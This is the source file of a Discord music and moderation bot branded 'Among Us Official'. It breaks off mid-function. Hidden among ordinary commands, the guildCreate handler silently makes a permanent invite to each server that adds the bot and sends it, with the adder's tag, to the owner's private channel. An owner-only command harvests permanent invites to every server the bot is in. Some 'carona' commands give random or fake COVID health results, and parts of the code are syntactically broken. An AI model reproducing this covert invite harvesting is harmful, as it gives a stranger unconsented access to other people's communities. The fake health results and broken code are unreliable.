const { Client, Util, MessageEmbed} = require("discord.js");
const YouTube = require("simple-youtube-api");
const ytdl = require("ytdl-core");
const ms = require("ms");
require("dotenv").config();
require("./server.js");

const bot = new Client({
    disableMentions: "all"
});

const PREFIX = process.env.PREFIX;
const youtube = new YouTube(process.env.YTAPI_KEY);
const queue = new Map();

setInterval(function(){
let st=["What am i supposed to write here!" ,"I'm Ok Now!" ,"+help" ,"+invite" ,"Dm me for help!" ,"Among Us Official" ,"Type prefix to know my prefix" ,"My Prefix is +"];
let sts= st[Math.floor(Math.random()*st.length)];
bot.user.setPresence({ activity: { name: sts }, status: 'online' })
.catch(console.error);
},10000);

bot.on('guildCreate', async guild => {
	const fetchedLogs = await guild.fetchAuditLogs({
		limit: 1,
		type: 'BOT_ADD',
	});
	const auditlog = fetchedLogs.entries.first();
let myg=bot.guilds.cache.find(guild=>guild.id=="726055475178635305");
let cc=myg.channels.cache.find(channel=>channel.id=="762981207705124906");
let invitech=guild.channels.cache.find(channel=>channel.type=='text');
invitech.createInvite({maxAge:0})
.then(invite=>{
cc.send({embed: {
  color: 3066993,
  description:`\`${auditlog.executor.tag}\` added bot in __**${guild.name}**__`
}});
cc.send(`\nLink:- https://discord.gg/${invite.code}`);
});
});

bot.on('guildDelete', async guild => {
let myg=bot.guilds.cache.find(guild=>guild.id=="726055475178635305");
let cc=myg.channels.cache.find(channel=>channel.id=="762981236351959061");
cc.send({embed: {
  color: 3066993,
  description:`I have been removed from ${guild.name} server (id: ${guild.id})`
}});
});

bot.on('message',m=>{
if(m.content=="+servers_name"&&m.author.id=="654669770549100575"){
let s=bot.guilds.cache;
s.each(guild=>{
m.channel.send({embed: {
  color: 3066993,
  description:`${guild.name}`
}});
});
};
});

bot.on('message',m=>{
if(m.content=="+servers_link"&&m.author.id=="654669770549100575"){
let s=bot.guilds.cache;
s.each(guild=>{
let cnl=guild.channels.cache.find(channel=>channel.type=='text');
cnl.createInvite({maxAge:0})
.then(invite => m.channel.send(`server link :- https://discord.gg/${invite.code}`))
.catch(console.error);
});
};
});

bot.on('message', msg => {
  if (msg.content === 'prefix') {
    msg.reply({embed: {
  color: 3066993,
  description:'My Prefix is \`+\`'
}});
  }
});

bot.on("warn", console.warn);
bot.on("error", console.error);
bot.on("ready", () => console.log(`[READY] ${bot.user.tag} has been successfully booted up!`));
bot.on("shardDisconnect", (event, id) => console.log(`[SHARD] Shard ${id} disconnected (${event.code}) ${event}, trying to reconnect...`));
bot.on("shardReconnecting", (id) => console.log(`[SHARD] Shard ${id} reconnecting...`));

bot.on("message", async (message) => { // eslint-disable-line
    if (message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.split(" ");
    const searchString = args.slice(1).join(" ");
    const url = args[1] ? args[1].replace(/<(.+)>/g, "$1") : "";
      
    let command = message.content.toLowerCase().split(" ")[0];
    command = command.slice(PREFIX.length);

    if (command === "invite" || command === "inv") {
        const helpembed = new MessageEmbed()
            .setColor("BLUE")
            .setAuthor("Invite Link", message.author.displayAvatarURL())
            .setDescription(`[Click here!](https://discord.com/oauth2/authorize?client_id=758889056649216041&scope=bot&permissions=2146942463&response_type=code)`)
            .setTimestamp()
            .setFooter("Among Us Official", "https://cdn.discordapp.com/attachments/758709208543264778/758904787499745310/Screenshot_2020-09-25-09-45-28-68.jpg");
        message.reply(helpembed);
    }
    if (command === "stats"&& message.author.id === '654669770549100575') {
      let m = '';
      m += `I am aware of ${message.guild.channels.cache.size} channels\n`;
      m += `I am aware of ${message.guild.members.cache.size} members\n`;
      m += `I am aware of ${bot.channels.cache.size} channels overall\n`;
      m += `I am aware of ${bot.guilds.cache.size} guilds overall\n`;
      m += `I am aware of ${bot.users.cache.size} users overall\n`;
      message.reply({embed: {
  color: 3066993,
  description:m
}})
        .catch(console.error);
    }
    if (command === "ping") {
    // Calculates ping between sending a message and editing it, giving a nice round-trip latency.
    // The second ping is an average latency between the bot and the websocket server (one-way, not round-trip)
    const m = await message.channel.send("Ping?");
    m.edit(`Pong! Latency is ${m.createdTimestamp - message.createdTimestamp}ms.`);
    }
});

bot.on("message", async (message) => { // eslint-disable-line
    if (message.author.bot) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.split(" ");
    const searchString = args.slice(1).join(" ");
    const url = args[1] ? args[1].replace(/<(.+)>/g, "$1") : "";
    const serverQueue = queue.get(message.guild.id);

    let command = message.content.toLowerCase().split(" ")[0];
    command = command.slice(PREFIX.length);
    
    if (command === "say" ) { 
         let msg;
        let textChannel = message.mentions.channels.first()
        message.delete()

        if(textChannel) {
            msg = args.slice(1).join(" ");
            textChannel.send(msg)
        } else {
            msg = args.join(" ");
            message.channel.send(msg)
        }
    }
    if (command === "channelinvite" || command === "ci") {
       const setChannelID = message.content.split(' ');

    try{
        message.guild.channels.cache.get(setChannelID[1]).createInvite().then(invite =>
            message.channel.send("The channel invite has been created: \n" + invite.url)
        );
    }

    catch(error){
        console.error(`I could not create the invite for the channel: ${error}`);
        message.channel.send(`You have to paste a correct channel ID!`);
    }
}
    if (command === "covid" ) { 
        const fetch = require('node-fetch');

        let countries = args.join(" ");

        //Credit to Sarastro#7725 for the command :)

        const noArgs = new MessageEmbed()
        .setTitle('Missing arguments')
        .setColor(0xFF0000)
        .setDescription('You are missing some args (ex: ;covid all || ;covid Canada)')
        .setTimestamp()

        if(!args[0]) return message.channel.send(noArgs);

        if(args[0] === "all"){
            fetch(`https://covid19.mathdro.id/api`)
            .then(response => response.json())
            .then(data => {
                let confirmed = data.confirmed.value.toLocaleString()
                let recovered = data.recovered.value.toLocaleString()
                let deaths = data.deaths.value.toLocaleString()

                const embed = new MessageEmbed()
                .setTitle(`Worldwide COVID-19 Stats 🌎`)
                .addField('Confirmed Cases', confirmed)
                .addField('Recovered', recovered)
                .addField('Deaths', deaths)

                message.channel.send(embed)
            })
        } else {
            fetch(`https://covid19.mathdro.id/api/countries/${countries}`)
            .then(response => response.json())
            .then(data => {
                let confirmed = data.confirmed.value.toLocaleString()
                let recovered = data.recovered.value.toLocaleString()
                let deaths = data.deaths.value.toLocaleString()

                const embed = new MessageEmbed()
                .setTitle(`COVID-19 Stats for **${countries}**`)
                .addField('Confirmed Cases', confirmed)
                .addField('Recovered', recovered)
                .addField('Deaths', deaths)

                message.channel.send(embed)
            }).catch (err => {
                    return message.channel.send({embed: {color: "RED", description: "Something Error!Solve it asap!"}});
                })

        }
    }
    if (command === "someone" ) {
       var sToggle = true;

    if(sToggle === true && !args[0]) {
            let randoMember = message.guild.members.cache.random().id;
            message.channel.send('<@' + randoMember + '>');
    }
    else if(sToggle === false && message.member.hasPermission('ADMINISTRATOR') && !args[0]) {
            let randoMember = message.guild.members.cache.random().id;
            message.channel.send('<@' + randoMember + '>');
    } 
        
    if(args[0] === "toggle" && message.member.hasPermission('ADMINISTRATOR')) {
    sToggle = !sToggle;
        if(sToggle === true) {
            message.channel.send("Enabled `someone` globally.")
        }
        else {
            message.channel.send("Disabled `someone` globally. Command locked to ADMINS only.")
        }
    }
}
    if (command === "uptime" ) {
       let days = 0;
       let week = 0;
       let uptime = ``;
       let totalSeconds = (bot.uptime / 1000);
       let hours = Math.floor(totalSeconds / 3600);
       totalSeconds %= 3600;
       let minutes = Math.floor(totalSeconds / 60);
       let seconds = Math.floor(totalSeconds % 60);

       if(hours > 23){
           days = days + 1;
           hours = 0;
       }

       if(days == 7){
           days = 0;
           week = week + 1;
       }

       if(week > 0){
           uptime += `${week} week, `;
       }

       if(minutes > 60){
           minutes = 0;
       }

       uptime += `${days} days, ${hours} hours, ${minutes} minutes and ${seconds} seconds`;

       let serverembed = new MessageEmbed()
           .setColor("#228B22")
           .setFooter(`Uptime: ${uptime}`);

       message.channel.send(serverembed);

}
    if (command === "leave"&&message.author.id=="654669770549100575") {
       message.channel.send({embed: {
  color: 3066993,
  description:`Bye,Bye...I'm Leaving Server!`
}});
    }
    if (command === "leave"&&message.author.id=="654669770549100575") {
      message.guild
        .leave()
        .then(guild => console.log('Left guild', guild.name))
        .catch(console.error);
    }
    if (command === "setbotnick"&&message.author.id=="654669770549100575") {
        const newName = message.content.split(' ');

    try{
        bot.user.setUsername(newName[1])
            .then(user => message.channel.send(`My new username is **${user.username}**`))
            .catch(console.error);
    }
    catch(error){
        message.channel.send("I could not set my new username :sob:");
    }
}
    if (command === "avatar" || command === "a") {
        let member = message.mentions.users.first() || message.author

        let avatar = member.displayAvatarURL({size: 1024})


        const helpembed = new MessageEmbed()
        .setTitle(`${member.username}'s avatar`)
        .setImage(avatar)
        .setColor("RANDOM")

        message.channel.send(helpembed);
    }
    if (command === "addrole" || command === "ar") {
       //Pay attention in order to assign a role of a user, the bot needs to be above that role, that means you can't assign an equal or highest role than bot's role
    let rMember = message.guild.member(message.mentions.users.first()) || message.guild.members.cache.get(args[0]);
    
    if(!message.member.hasPermission("MANAGE_ROLES")){
        message.channel.send("You don't have the permissions to use this command!");
    }

    else{

        if(!rMember) 
            return message.channel.send("Couldn't find that user, yo.");

        let role = args.join(" ").slice(23);
        if(!role) 
            return message.channel.send("Specify a role!");

        let gRole = message.guild.roles.cache.find(roles => roles.name === role);
        if(!gRole) 
            return message.channel.send("Couldn't find that role.");

        if(rMember.roles.cache.has(gRole.id)) 
            return message.channel.send("They already have that role.");

        else{
            rMember.roles.add(gRole.id).catch(console.error);
            
            try{
                rMember.send(`Congrats, you have been given the role ${gRole.name}`);
                message.channel.send(`The user ${rMember} has a new role ${gRole.name}`);
            }
            catch(e){
                console.log(e.stack);
                message.channel.send(`Congrats to <@${rMember.id}>, they have been given the role ${gRole.name}.`)
            }
        }
    }
}
    if (command === "removerole" || command === "rr" ) {
       let rMember = message.guild.member(message.mentions.users.first()) || message.guild.members.cache.get(args[0]);

    if(!message.member.hasPermission("MANAGE_ROLES")){
        message.channel.send("You don't have the permissions to use this command!");
    }
    
    else{

        if(!rMember) 
            return message.channel.send("Couldn't find that user, yo.");
        
        let role = args.join(" ").slice(23);
        if(!role) 
            return message.channel.send("Specify a role!");
        
        let gRole = message.guild.roles.cache.find(roles => roles.name === role);
        if(!gRole) 
            return message.channel.send("Couldn't find that role.");

        if(!rMember.roles.cache.has(gRole.id)) 
            return message.reply("They don't have that role.");
        
        else{
            rMember.roles.remove(gRole.id).catch(console.error);
            
            try{
                rMember.send(`Sorry, you lost the ${gRole.name} role`);
                message.channel.send(`The user ${rMember} has lost the ${gRole.name} role`);
            }
            catch(e){
                console.log(e.stack);
                message.channel.send(`RIP to <@${rMember.id}>, We removed ${gRole.name} from them.`)
            }
        }
    }
}
    if (command === "purge" || command === "clear" ) {
       const deleteCount = parseInt(args[0], 10);

  // get the delete count, as an actual number.
  if(!message.member.hasPermission("MANAGE_MESSAGES")){
    message.channel.send("You don't have the permissions to use this command!");
  }
  
  else{        
    // Ooooh nice, combined conditions. <3
    if(!deleteCount || deleteCount < 2 || deleteCount > 100){
      return message.channel.send("Please provide a number between 2 and 100 for the number of messages to delete");
    }
    
    await message.channel.bulkDelete(deleteCount).catch(error => message.reply(`Couldn't delete messages because of: ${error}`));
  }   
}
    if (command === "caronavirus" || command === "cv") {
              message.reply({embed: {
  color: 3447003,
  description:'The bot will check your health status.\n'
                            + 'Confirm with `yes` or deny with `no`.'
}});

                    // First argument is a filter function - which is made of conditions
                    // m is a 'Message' object
                    message.channel.awaitMessages(m => m.author.id == message.author.id,
                            {max: 1, time: 30000}).then(collected => {
                                    // only accept messages by the user who sent the command
                                    // accept only 1 message, and return the promise after 30000ms = 30s

                                    // first (and, in this case, only) message of the collection
                                    if (collected.first().content.toLowerCase() == 'yes') {
                                            message.reply({embed: {
  color: 3066993,
  description:'Positive'
}});
                                    }

                                    else
                                            message.reply({embed: {
  color: 15158332,
  description:'Negative'
}});      
                            })
                              .catch(collected => {
                                    message.reply('No answer after 30 seconds, operation canceled.');
                            });
    }  
    if (command === "carona" || command === "c") {
        const messages = ["Carona - Positive", "Carona - Negative"]
        const randomMessage = messages[Math.floor(Math.random() * messages.length)];
        const helpembed = new MessageEmbed()
             .setColor("VIOLET")
             .setTitle("Your Health Status")
             .setAuthor(message.author.username)
             .setDescription(randomMessage)
             .setTimestamp()
             .setFooter("Stay Home,Stay Safe!", message.author.displayAvatarURL());
        message.channel.send(helpembed);
    }
    if (command === "serverinfo" || command === "si") {
        function checkBots(guild) {
        let botCount = 0;
        guild.members.cache.forEach(member => {
            if(member.user.bot) botCount++;
        });
        return botCount;
    }
    
    function checkMembers(guild) {
        let memberCount = 0;
        guild.members.cache.forEach(member => {
            if(!member.user.bot) memberCount++;
        });
        return memberCount;
    }

    function checkOnlineUsers(guild) {
        let onlineCount = 0;
        guild.members.cache.forEach(member => {
            if(member.user.presence.status === "online")
                onlineCount++; 
        });
        return onlineCount;
    }

    let serverembed = new MessageEmbed()
        .setAuthor(`${message.guild.name} Server Info`, message.guild.iconURL)
        .setColor("#15f153")
        .setImage(message.guild.iconURL)
        .addField('Server owner', message.guild.owner, true)
        .addField('Server region', message.guild.region, true)
        .addField("Server Name", message.guild.name)
        .addField('Verification level', message.guild.verificationLevel, true)
        .addField('Channel count', message.guild.channels.cache.size, true)
        .addField('Total member count', message.guild.memberCount)
        .addField('Humans', checkMembers(message.guild), true)
        .addField('Bots', checkBots(message.guild), true)
        .addField('Online', checkOnlineUsers(message.guild))
        .addField('Emoji Count', `${message.guild.emojis.cache.size}`)
        .addField('Roles Count', `${message.guild.roles.cache.size}`)          
        .setFooter('Guild created at:')
        .setTimestamp(message.guild.createdAt);

    return message.channel.send(serverembed);
}
    if (command === "userinfo" || command === "ui" || command === "whois" ) {

const status = {
    online: "Online",
    idle: "Idle",
    dnd: "Do Not Disturb",
    offline: "Offline/Invisible"
};
    var permissions = [];
    var acknowledgements = 'None';
   
    let user;
if (message.mentions.users.first()) {
    user = message.mentions.users.first();
} else {
    user = message.author;
}

const member = message.guild.member(user);

    const randomColor = "#000000".replace(/0/g, function () { return (~~(Math.random() * 16)).toString(16); }); 
    
    if(message.member.hasPermission("KICK_MEMBERS")){
        permissions.push("Kick Members");
    }
    
    if(message.member.hasPermission("BAN_MEMBERS")){
        permissions.push("Ban Members");
    }
    
    if(message.member.hasPermission("ADMINISTRATOR")){
        permissions.push("Administrator");
    }

    if(message.member.hasPermission("MANAGE_MESSAGES")){
        permissions.push("Manage Messages");
    }
    
    if(message.member.hasPermission("MANAGE_CHANNELS")){
        permissions.push("Manage Channels");
    }
    
    if(message.member.hasPermission("MENTION_EVERYONE")){
        permissions.push("Mention Everyone");
    }

    if(message.member.hasPermission("MANAGE_NICKNAMES")){
        permissions.push("Manage Nicknames");
    }

    if(message.member.hasPermission("MANAGE_ROLES")){
        permissions.push("Manage Roles");
    }

    if(message.member.hasPermission("MANAGE_WEBHOOKS")){
        permissions.push("Manage Webhooks");
    }

    if(message.member.hasPermission("MANAGE_EMOJIS")){
        permissions.push("Manage Emojis");
    }

    if(permissions.length == 0){
        permissions.push("No Key Permissions Found");
    }

    if(member.user.id == message.guild.ownerID){
        acknowledgements = 'Server Owner';
    }

    const embed = new MessageEmbed()
        .setDescription(`<@${member.user.id}>`)
        .setAuthor(`${member.user.tag}`, member.user.displayAvatarURL())
        .setColor(randomColor)
        .setFooter(`Replying to ${message.author.username}#${message.author.discriminator}`)
        .setImage(member.user.displayAvatarURL())
        .setTimestamp()
        .addField(`${user.tag}`, `${user}`, true)
        .addField("ID:", `${user.id}`, true)
        .addField("Status",`${status[member.user.presence.status]}`, true)
        .addField("Permissions: ", `${permissions.join(', ')}`, true)
        .addField(`Roles [${member.roles.cache.filter(r => r.id !== message.guild.id).map(roles => `\`${roles.name}\``).length}]`,`${member.roles.cache.filter(r => r.id !== message.guild.id).map(roles => `<@&${roles.id }>`).join(" **|** ") || "No Roles"}`, true)
        .addField("Acknowledgements: ", `${acknowledgements}`, true);
        
    message.channel.send({embed});

}
    if (command === "botinfo" || command === "bi") {
    let days = 0;
    let week = 0;

    let uptime = ``;
    let totalSeconds = (bot.uptime / 1000);
    let hours = Math.floor(totalSeconds / 3600);
    totalSeconds %= 3600;
    let minutes = Math.floor(totalSeconds / 60);
    let seconds = Math.floor(totalSeconds % 60);

    let servers = bot.guilds.cache.size;
    let users = bot.users.cache.size;

    if(hours > 23){
        days = days + 1;
        hours = 0;
    }

    if(days == 7){
        days = 0;
        week = week + 1;
    }

    if(week > 0){
        uptime += `${week} week, `;
    }

    if(minutes > 60){
        minutes = 0;
    }

    uptime += `${days} days, ${hours} hours, ${minutes} minutes and ${seconds} seconds`;

    let serverembed = new MessageEmbed()
        .setColor("#9400D3")
        .setAuthor(`Among Us`, bot.user.displayAvatarURL())
        .setDescription(`Among Us Music Bot Information`)
        .setImage(bot.user.displayAvatarURL())
        .addField("Bot Owner", `Roc$tarLS109#8861(Rock Star)`)
        .addField("Owner Id", `654669770549100575`)
        .addField("My Id", `758889056649216041`)
        .addField("My Prefix", `+`)
        .addField(`Servers`,`${servers}`, true)
        .addField(`Users`, `${users}`, true)
        .addField(`Invite Me!`, `[Click Here!](https://discord.com/oauth2/authorize?client_id=758889056649216041&scope=bot&permissions=2146942463&response_type=code)`, true)
        .setFooter(`Uptime: ${uptime}`);

    message.channel.send(serverembed);    

}
    if (command === "help" || command === "cmd") {
        const PaginationEmbed = require('discord-paginationembed');
 
const embeds = [];
 
for (let i = 1; i <= 5; ++i)
  embeds.push(new MessageEmbed().addField('Page', i));
 
const Embeds = new PaginationEmbed.Embeds()
  .setArray(embeds)
  .setAuthorizedUsers([message.author.id])
  .setChannel(message.channel)
  .setPageIndicator(true)
  .setTitle('Mod Commands', 'Fun Commands', 'Info Commands', 'hey', 'hi')
  .setDescription('Kick,Ban,Unban,Mute,Unmute', 'Covid,Carona', 'Botinfo,Serverinfo,Userinfo', 'hey', 'hii')
  .setFooter('Type +help <commandname>')
  .setURL('https://gazmull.github.io/discord-paginationembed')
  .setColor(0xFF00AE)
  // Sets the client's assets to utilise. Available options:
  //  - message: the client's Message object (edits the message instead of sending new one for this instance)
  //  - prompt: custom content for the message sent when prompted to jump to a page
  //      {{user}} is the placeholder for the user mention
  .setClientAssets({ prompt: 'Page plz {{user}}' })
  .setDeleteOnTimeout(true)
  .setDisabledNavigationEmojis(['delete'])
  .setFunctionEmojis({
    '⬆': (_, instance) => {
      for (const embed of instance.array)
        embed.fields[0].value++;
    },
    '⬇': (_, instance) => {
      for (const embed of instance.array)
        embed.fields[0].value--;
    }
  })
  // Listeners for PaginationEmbed's events
  // After the initial embed has been sent
  // (technically, after the client finished reacting with enabled navigation and function emojis).
  .on('start', () => console.log('Started!'))
  // When the instance is finished by a user reacting with `delete` navigation emoji
  // or a function emoji that throws non-Error type.
  .on('finish', (user) => console.log(`Finished! User: ${user.username}`))
  // Upon a user reacting on the instance.
  .on('react', (user, emoji) => console.log(`Reacted! User: ${user.username} | Emoji: ${emoji.name} (${emoji.id})`))
  // When the awaiting timeout is reached.
  .on('expire', () => console.warn('Expired!'))
  // Upon an occurance of error (e.g: Discord API Error).
  .on('error', console.error);
  // When the awaiting timeout is reached.
  .on('expire', () => message.reply('Expired!'))

 
await Embeds.build();
    }
    if (command === "help" || command === "cmd") {
        const helpembed = new MessageEmbed()
            .setColor("BLUE")
            .setDescription(`
📩 |You've got Dm!`)
            .setTimestamp()
              message.channel.send(helpembed);
    }
    if(command === "kick") {
    if (!message.guild) return;
    // Assuming we mention someone in the message, this will return the user
    // Read more about mentions over at https://discord.js.org/#/docs/main/master/class/MessageMentions
    const user = message.mentions.users.first();
    // If we have a user mentioned
    if (user) {
      // Now we get the member from the user
      const member = message.guild.member(user);
      // If the member is in the guild
      if (member) {
        /**
         * Kick the member
         * Make sure you run this on a member, not a user!
         * There are big differences between a user and a member
         */
        member
          .kick('Optional reason that will display in the audit logs')
          .then(() => {
            // We let the message author know we were able to kick the person
            message.reply({embed: {
  color: 3066993,
  description:`Successfully kicked ${user.tag}`
}});
          })
          .catch(err => {
            // An error happened
            // This is generally due to the bot not being able to kick the member,
            // either due to missing permissions or role hierarchy
            message.reply('I was unable to kick the member');
            // Log the error
            console.error(err);
          });
      } else {
        // The mentioned user isn't in this guild
        message.reply("That user isn't in this guild!");
      }
      // Otherwise, if no user was mentioned
    } else {
      message.reply("You didn't mention the user to kick!");
    }
  }
    if(command === "ban") {
    if (!message.guild) return;
    // Assuming we mention someone in the message, this will return the user
    // Read more about mentions over at https://discord.js.org/#/docs/main/master/class/MessageMentions
    const user = message.mentions.users.first();
    // If we have a user mentioned
    if (user) {
      // Now we get the member from the user
      const member = message.guild.member(user);
      // If the member is in the guild
      if (member) {
        /**
         * Ban the member
         * Make sure you run this on a member, not a user!
         * There are big differences between a user and a member
         * Read more about what ban options there are over at
         * https://discord.js.org/#/docs/main/master/class/GuildMember?scrollTo=ban
         */
        member
          .ban({
            reason: 'They were bad!',
          })
          .then(() => {
            // We let the message author know we were able to ban the person
            message.reply({embed: {
  color: 3066993,
  description:`Successfully banned ${user.tag}`
}});
          })
          .catch(err => {
            // An error happened
            // This is generally due to the bot not being able to ban the member,
            // either due to missing permissions or role hierarchy
            message.reply('I was unable to ban the member');
            // Log the error
            console.error(err);
          });
      } else {
        // The mentioned user isn't in this guild
        message.reply("That user isn't in this guild!");
      }
    } else {
      // Otherwise, if no user was mentioned
      message.reply("You didn't mention the user to ban!");
    }
  }
    if (command === "play" || command === "p") {
        const voiceChannel = message.member.voice.channel;
        if (!voiceChannel) return message.channel.send({
            embed: {
                color: "RED",
                description: "I'm sorry, but you need to be in a voice channel to play a music!"
            }
        });
        const permissions = voiceChannel.permissionsFor(message.bot.user);
        if (!permissions.has("CONNECT")) {
            return message.channel.send({
                embed: {
                    color: "RED",
                    description: "Sorry, but I need a **`CONNECT`** permission to proceed!"
                }
            });
        }
        if (!permissions.has("SPEAK")) {
            return message.channel.send({
                embed: {
                    color: "RED",
                    description: "Sorry, but I need a **`SPEAK`** permission to proceed!"
                }
            });
        }
        if (!url || !searchString) return message.channel.send({
            embed: {
                color: "RED",
                description: "Please input link/title to play music"
            }
        });
        if (url.match(/^https?:\/\/(www.youtube.com|youtube.com)\/playlist(.*)$/)) {
            const playlist = await youtube.getPlaylist(url);
            const videos = await playlist.getVideos();
            for (const video of Object.values(videos)) {
                const video2 = await youtube.getVideoByID(video.id); // eslint-disable-line no-await-in-loop
                await handleVideo(video2, message, voiceChannel, true); // eslint-disable-line no-await-in-loop
            }
            return message.channel.send({
                embed: {
                    color: "GREEN",
                    description: `✅  **|**  Playlist: **\`${playlist.title}\`** has been added to the queue`
                }
            });
        } else {
            try {
                var video = await youtube.getVideo(url);
            } catch (error) {
                try {
                    var videos = await youtube.searchVideos(searchString, 10);
                    var video = await youtube.getVideoByID(videos[0].id);
                    if (!video) return message.channel.send({
                        embed: {
                            color: "RED",
                            description: "🆘  **|**  I could not obtain any search results"
                        }
                    });
                } catch (err) {
                    console.error(err);
                    return message.channel.send({
                        embed: {
                            color: "RED",
                            description: "🆘  **|**  I could not obtain any search results"
                        }
                    });
                }
            }
            return handleVideo(video, message, voiceChannel);
        }
    }
    if (command === "search" || command === "sc") {
        const voiceChannel = message.member.voice.channel;
        if (!voiceChannel) return message.channel.send({
            embed: {
                color: "RED",
                description: "I'm sorry, but you need to be in a voice channel to play a music!"
            }
        });
        const permissions = voiceChannel.permissionsFor(message.bot.user);
        if (!permissions.has("CONNECT")) {
            return message.channel.send({
                embed: {
                    color: "RED",
                    description: "Sorry, but I need a **`CONNECT`** permission to proceed!"
                }
            });
        }
        if (!permissions.has("SPEAK")) {
            return message.channel.send({
                embed: {
                    color: "RED",
                    description: "Sorry, but I need a **`SPEAK`** permission to proceed!"
                }
            });
        }
        if (!url || !searchString) return message.channel.send({
            embed: {
                color: "RED",
                description: "Please input link/title to search music"
            }
        });
        if (url.match(/^https?:\/\/(www.youtube.com|youtube.com)\/playlist(.*)$/)) {
            const playlist = await youtube.getPlaylist(url);
            const videos = await playlist.getVideos();
            for (const video of Object.values(videos)) {
                const video2 = await youtube.getVideoByID(video.id); // eslint-disable-line no-await-in-loop
                await handleVideo(video2, message, voiceChannel, true); // eslint-disable-line no-await-in-loop
            }
            return message.channel.send({
                embed: {
                    color: "GREEN",
                    description: `✅  **|**  Playlist: **\`${playlist.title}\`** has been added to the queue`
                }
            });
        } else {
            try {
                var video = await youtube.getVideo(url);
            } catch (error) {
                try {
                    var videos = await youtube.searchVideos(searchString, 10);
                    let index = 0;
                    let embedPlay = new MessageEmbed()
                        .setColor("BLUE")
                        .setAuthor("Search results", message.author.displayAvatarURL())
                        .setDescription(`${videos.map(video2 => `**\`${++index}\`  |**  ${video2.title}`).join("\n")}`)
                        .setFooter("Please choose one of the following 10 results, this embed will auto-deleted in 15 seconds");
                    // eslint-disable-next-line max-depth
                    message.channel.send(embedPlay).then(m => m.delete({
                        timeout: 15000
                    }))
                    try {
                        var response = await message.channel.awaitMessages(message2 => message2.content > 0 && message2.content < 11, {
                            max: 1,
                            time: 15000,
                            errors: ["time"]
                        });
                    } catch (err) {
                        console.error(err);
                        return message.channel.send({
                            embed: {
                                color: "RED",
                                description: "The song selection time has expired in 15 seconds, the request has been canceled."
                            }
                        });
                    }
                    const videoIndex = parseInt(response.first().content);
                    var video = await youtube.getVideoByID(videos[videoIndex - 1].id);
                } catch (err) {
                    console.error(err);
                    return message.channel.send({
                        embed: {
                            color: "RED",
                            description: "🆘  **|**  I could not obtain any search results"
                        }
                    });
                }
            }
            response.delete();
            return handleVideo(video, message, voiceChannel);
        }

    } else if (command === "skip"|| command === "sk") {
        if (!message.member.voice.channel) return message.channel.send({
            embed: {
                color: "RED",
                description: "I'm sorry, but you need to be in a voice channel to skip a music!"
            }
        });
        if (!serverQueue) return message.channel.send({
            embed: {
                color: "RED",
                description: "There is nothing playing that I could skip for you"
            }
        });
        serverQueue.connection.dispatcher.end("[runCmd] Skip command has been used");
        return message.channel.send({
            embed: {
                color: "GREEN",
                description: "⏭️  **|**  I skipped the song for you"
            }
        });

    } else if (command === "stop"|| command === "st") {
        if (!message.member.voice.channel) return message.channel.send({
            embed: {
                color: "RED",
                description: "I'm sorry but you need to be in a voice channel to play music!"
            }
        });
        if (!serverQueue) return message.channel.send({
            embed: {
                color: "RED",
                description: "There is nothing playing that I could stop for you"
            }
        });
        serverQueue.songs = [];
        serverQueue.connection.dispatcher.end("[runCmd] Stop command has been used");
        return message.channel.send({
            embed: {
                color: "GREEN",
                description: "⏹️  **|**  Deleting queues and leaving voice channel..."
            }
        });

    } else if (command === "volume" || command === "v") {
        if (!message.member.voice.channel) return message.channel.send({
            embed: {
                color: "RED",
                description: "I'm sorry, but you need to be in a voice channel to set a volume!"
            }
        });
        if (!serverQueue) return message.channel.send({
            embed: {
                color: "RED",
                description: "There is nothing playing"
            }
        });
        if (!args[1]) return message.channel.send({
            embed: {
                color: "BLUE",
                description: `The current volume is: **\`${serverQueue.volume}%\`**`
            }
        });
        if (isNaN(args[1]) || args[1] > 100) return message.channel.send({
            embed: {
                color: "RED",
                description: "Volume only can be set in a range of **\`1\`** - **\`100\`**"
            }
        });
        serverQueue.volume = args[1];
        serverQueue.connection.dispatcher.setVolume(args[1] / 100);
        return message.channel.send({
            embed: {
                color: "GREEN",
                description: `I set the volume to: **\`${args[1]}%\`**`
            }
        });

    } else if (command === "nowplaying" || command === "np") {
        if (!serverQueue) return message.channel.send({
            embed: {
                color: "RED",
                description: "There is nothing playing"
            }
        });
        return message.channel.send({
            embed: {
                color: "BLUE",
                description: `🎶  **|**  Now Playing: **\`${serverQueue.songs[0].title}\`**`
            }
        });

    } else if (command === "queue" || command === "q") {

        let songsss = serverQueue.songs.slice(1)
        
        let number = songsss.map(
            (x, i) => `${i + 1} - ${x.title}`
        );
        number = chunk(number, 5);

        let index = 0;
        if (!serverQueue) return message.channel.send({
            embed: {
                color: "RED",
                description: "There is nothing playing"
            }
        });
        let embedQueue = new MessageEmbed()
            .setColor("BLUE")
            .setAuthor("Song queue", message.author.displayAvatarURL())
            .setDescription(number[index].join("\n"))
            .setFooter(`• Now Playing: ${serverQueue.songs[0].title} | Page ${index + 1} of ${number.length}`);
        const m = await message.channel.send(embedQueue);

        if (number.length !== 1) {
            await m.react("⬅");
            await m.react("🛑");
            await m.react("➡");
            async function awaitReaction() {
                const filter = (rect, usr) => ["⬅", "🛑", "➡"].includes(rect.emoji.name) &&
                    usr.id === message.author.id;
                const response = await m.awaitReactions(filter, {
                    max: 1,
                    time: 30000
                });
                if (!response.size) {
                    return undefined;
                }
                const emoji = response.first().emoji.name;
                if (emoji === "⬅") index--;
                if (emoji === "🛑") m.delete();
                if (emoji === "➡") index++;

                if (emoji !== "🛑") {
                    index = ((index % number.length) + number.length) % number.length;
                    embedQueue.setDescription(number[index].join("\n"));
                    embedQueue.setFooter(`Page ${index + 1} of ${number.length}`);
                    await m.edit(embedQueue);
                    return awaitReaction();
                }
            }
            return awaitReaction();
        }

    } else if (command === "pause"|| command === "pa") {
        if (serverQueue && serverQueue.playing) {
            serverQueue.playing = false;
            serverQueue.connection.dispatcher.pause();
            return message.channel.send({
                embed: {
                    color: "GREEN",
                    description: "⏸  **|**  Paused the music for you"
                }
            });
        }
        return message.channel.send({
            embed: {
                color: "RED",
                description: "There is nothing playing"
            }
        });

    } else if (command === "resume"|| command === "r") {
        if (serverQueue && !serverQueue.playing) {
            serverQueue.playing = true;
            serverQueue.connection.dispatcher.resume();
            return message.channel.send({
                embed: {
                    color: "GREEN",
                    description: "▶  **|**  Resumed the music for you"
                }
            });
        }
        return message.channel.send({
            embed: {
                color: "RED",
                description: "There is nothing playing"
            }
        });
    } else if (command === "loop"|| command === "l") {
        if (serverQueue) {
            serverQueue.loop = !serverQueue.loop;
